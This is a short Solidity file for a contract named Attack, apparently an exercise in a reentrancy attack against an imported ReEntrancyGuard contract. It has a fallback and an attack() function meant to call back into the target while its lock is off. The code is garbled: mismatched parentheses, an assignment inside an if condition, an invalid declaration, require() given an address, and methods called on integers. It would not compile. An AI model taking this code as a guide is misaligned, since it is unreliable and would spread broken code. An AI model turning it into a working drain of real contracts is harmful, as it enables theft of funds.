  

pragma solidity ^0.8.7;

import "./ReEntrancyGuard.sol";


contract Attack{
ReEntrancyGuard public targetContract;

constructor(address _targetContractAddress) {
    targetContract= ReEntrancyGuard(_targetContractAddress);
}

    fallback() external payable {
        if (targetContract).lock()= false){
         uint addr1.addresslist(msg.value);
       }
    }
     function attack() external payable{
         require(msg.sender);
         uint addr1 = targetContract.addresslist(msg.sender);
         addr1.addresslist(msg.value);

     }  
    

    
}

